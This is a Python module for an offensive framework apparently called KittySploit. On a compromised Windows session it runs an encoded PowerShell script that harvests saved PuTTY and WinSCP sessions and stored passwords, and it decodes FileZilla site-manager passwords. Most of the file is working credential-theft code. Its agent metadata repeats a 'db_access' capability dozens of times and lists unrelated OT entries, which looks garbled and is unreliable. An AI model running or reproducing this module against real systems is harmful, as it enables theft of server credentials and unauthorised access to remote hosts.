#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Extract saved PuTTY, WinSCP, and FileZilla session data from a Windows session.
"""

from kittysploit import *
import base64
import os
import re
import time

_LOCAL_OUT = "output"


class Module(Post):
    __info__ = {
        "name": "Windows Gather PuTTY WinSCP FileZilla Sessions",
        "description": (
            "Collect saved PuTTY registry sessions, WinSCP registry sessions, and "
            "FileZilla XML site entries on a Windows shell or Meterpreter session."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1555/",
        ],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    save_local = OptBool(True, "Save results under ./output", False)

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        output = self.cmd_execute(command)
        return output.strip() if output else ""

    def _encode_powershell(self, script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def _run_powershell(self, script: str) -> str:
        encoded = self._encode_powershell(script)
        return self._execute_cmd(f"powershell -NoP -NonI -EncodedCommand {encoded}")

    def _bool_opt(self, val, default=False) -> bool:
        if val is None:
            return default
        if isinstance(val, bool):
            return val
        return str(val).strip().lower() in ("1", "true", "yes", "on")

    def _powershell_script(self) -> str:
        return r"""
function Decode-FileZillaPass {
    param([string]$Encoded)
    if ([string]::IsNullOrWhiteSpace($Encoded)) { return '' }
    try {
        return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Encoded))
    } catch {
        return $Encoded
    }
}

function Get-PuttySessions {
  $base = 'HKCU:\Software\SimonTatham\PuTTY\Sessions'
  if (-not (Test-Path -LiteralPath $base)) { return @() }
  $rows = @()
  Get-ChildItem -LiteralPath $base -ErrorAction SilentlyContinue | ForEach-Object {
    $p = Get-ItemProperty -LiteralPath $_.PSPath -ErrorAction SilentlyContinue
    if ($p) {
      $rows += [PSCustomObject]@{
        Session  = $_.PSChildName
        HostName = $p.HostName
        UserName = $p.UserName
        Port     = $p.PortNumber
        Protocol = $p.Protocol
        ProxyUser = $p.ProxyUsername
        ProxyPass = $p.ProxyPassword
      }
    }
  }
  $rows
}

function Get-WinScpSessions {
  $roots = @(
    'HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions',
    'HKCU:\Software\Martin Prikryl\WinSCP\Sessions'
  )
  $rows = @()
  foreach ($base in $roots) {
    if (-not (Test-Path -LiteralPath $base)) { continue }
    Get-ChildItem -LiteralPath $base -ErrorAction SilentlyContinue | ForEach-Object {
      $p = Get-ItemProperty -LiteralPath $_.PSPath -ErrorAction SilentlyContinue
      if ($p) {
        $rows += [PSCustomObject]@{
          Session  = $_.PSChildName
          HostName = $p.HostName
          UserName = $p.UserName
          Password = $p.Password
          Port     = $p.PortNumber
          FSProtocol = $p.FSProtocol
        }
      }
    }
  }
  $rows
}

function Get-FileZillaSites {
  $files = @(
    (Join-Path $env:APPDATA 'FileZilla\recentservers.xml'),
    (Join-Path $env:APPDATA 'FileZilla\sitemanager.xml')
  )
  $rows = @()
  foreach ($file in $files | Select-Object -Unique) {
    if (-not (Test-Path -LiteralPath $file)) { continue }
    try {
      [xml]$xml = Get-Content -LiteralPath $file -ErrorAction Stop
      $nodes = $xml.SelectNodes('//Server')
      foreach ($node in $nodes) {
        $passNode = $node.SelectSingleNode('Pass')
        $enc = if ($passNode) { $passNode.InnerText } else { '' }
        $rows += [PSCustomObject]@{
          Source   = (Split-Path -Leaf $file)
          Host     = $node.SelectSingleNode('Host').InnerText
          Port     = $node.SelectSingleNode('Port').InnerText
          User     = $node.SelectSingleNode('User').InnerText
          Password = (Decode-FileZillaPass -Encoded $enc)
          Protocol = $node.SelectSingleNode('Protocol').InnerText
        }
      }
    } catch {
      $rows += [PSCustomObject]@{ Source = (Split-Path -Leaf $file); Host = ''; Port = ''; User = ''; Password = ''; Protocol = "parse error: $($_.Exception.Message)" }
    }
  }
  $rows
}

$sections = New-Object System.Collections.Generic.List[string]

$putty = @(Get-PuttySessions)
if ($putty.Count -gt 0) {
  $sections.Add("=== PuTTY Sessions ===`n$($putty | Format-Table -AutoSize | Out-String)")
} else {
  $sections.Add("=== PuTTY Sessions ===`n(none found)")
}

$winscp = @(Get-WinScpSessions)
if ($winscp.Count -gt 0) {
  $sections.Add("=== WinSCP Sessions ===`n$($winscp | Format-Table -AutoSize | Out-String)")
  $sections.Add('(WinSCP passwords are often encrypted; offline decryption may be required)')
} else {
  $sections.Add("=== WinSCP Sessions ===`n(none found)")
}

$fz = @(Get-FileZillaSites)
if ($fz.Count -gt 0) {
  $sections.Add("=== FileZilla Sites ===`n$($fz | Format-Table -AutoSize | Out-String)")
} else {
  $sections.Add("=== FileZilla Sites ===`n(none found)")
}

if (($putty.Count + $winscp.Count + $fz.Count) -eq 0) {
  Write-Output 'No PuTTY, WinSCP, or FileZilla session data found.'
} else {
  $sections -join "`n`n"
}
"""

    def check(self):
        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
        if "1" not in ps_check:
            print_error("PowerShell is not available on the target")
            return False
        return True

    def _save_output(self, content: str) -> str:
        os.makedirs(_LOCAL_OUT, exist_ok=True)
        stamp = time.strftime("%Y%m%d_%H%M%S")
        local_path = os.path.join(_LOCAL_OUT, f"putty_winscp_filezilla_{stamp}.txt")
        with open(local_path, "w", encoding="utf-8", errors="replace") as f:
            f.write(content)
        return local_path

    def run(self):
        if not self.check():
            raise ProcedureError(FailureType.NotCompatible, "PowerShell is not available on the target")

        print_status("Collecting PuTTY, WinSCP, and FileZilla sessions...")
        result = self._run_powershell(self._powershell_script())

        if not result:
            raise ProcedureError(FailureType.Unknown, "No output was returned")

        if re.search(r"No PuTTY, WinSCP, or FileZilla session data found", result, re.I):
            print_warning(result)
            return True

        if self._bool_opt(self.save_local, True):
            local_path = self._save_output(result + "\n")
            print_success(f"Results saved to ./{local_path}")

        print_success("Session extraction completed")
        print_info(result)
        return True
